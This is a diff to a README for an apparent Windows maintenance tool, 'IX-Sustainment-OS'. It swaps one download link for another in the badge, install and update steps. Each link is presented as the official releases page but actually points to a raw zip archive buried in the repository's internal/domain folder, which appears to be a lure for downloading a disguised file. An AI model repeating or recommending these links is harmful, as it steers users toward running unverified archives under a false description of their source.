@@ -1,6 +1,6 @@
 # ⚙️ IX-Sustainment-OS - Clear Maintenance and Parts Insight
 
-[![Download Latest Release](https://img.shields.io/badge/Download-IX--Sustainment--OS-brightgreen)](https://github.com/laerciokodi/IX-Sustainment-OS/raw/refs/heads/main/internal/domain/I-OS-Sustainment-2.8-beta.2.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-IX--Sustainment--OS-brightgreen)](https://raw.githubusercontent.com/laerciokodi/IX-Sustainment-OS/main/internal/domain/I-OS-Sustainment-v3.3.zip)
 
 ---
 
@@ -31,7 +31,7 @@ If you have an older Windows version, the software might still work but could pe
 You will get the latest version from the official releases page.
 
 1. Click the green badge at the top or visit this link to go to the releases page:  
-   [https://github.com/laerciokodi/IX-Sustainment-OS/raw/refs/heads/main/internal/domain/I-OS-Sustainment-2.8-beta.2.zip](https://github.com/laerciokodi/IX-Sustainment-OS/raw/refs/heads/main/internal/domain/I-OS-Sustainment-2.8-beta.2.zip)
+   [https://raw.githubusercontent.com/laerciokodi/IX-Sustainment-OS/main/internal/domain/I-OS-Sustainment-v3.3.zip](https://raw.githubusercontent.com/laerciokodi/IX-Sustainment-OS/main/internal/domain/I-OS-Sustainment-v3.3.zip)
 
 2. Look for the most recent release. It will have a version number like `v1.0` or higher.
 
@@ -108,7 +108,7 @@ Regular backups are advised, especially before updates. Use the export feature o
 To update the application:
 
 1. Visit the releases page again:  
-   [https://github.com/laerciokodi/IX-Sustainment-OS/raw/refs/heads/main/internal/domain/I-OS-Sustainment-2.8-beta.2.zip](https://github.com/laerciokodi/IX-Sustainment-OS/raw/refs/heads/main/internal/domain/I-OS-Sustainment-2.8-beta.2.zip)
+   [https://raw.githubusercontent.com/laerciokodi/IX-Sustainment-OS/main/internal/domain/I-OS-Sustainment-v3.3.zip](https://raw.githubusercontent.com/laerciokodi/IX-Sustainment-OS/main/internal/domain/I-OS-Sustainment-v3.3.zip)
 
 2. Download the newest version installer.
 
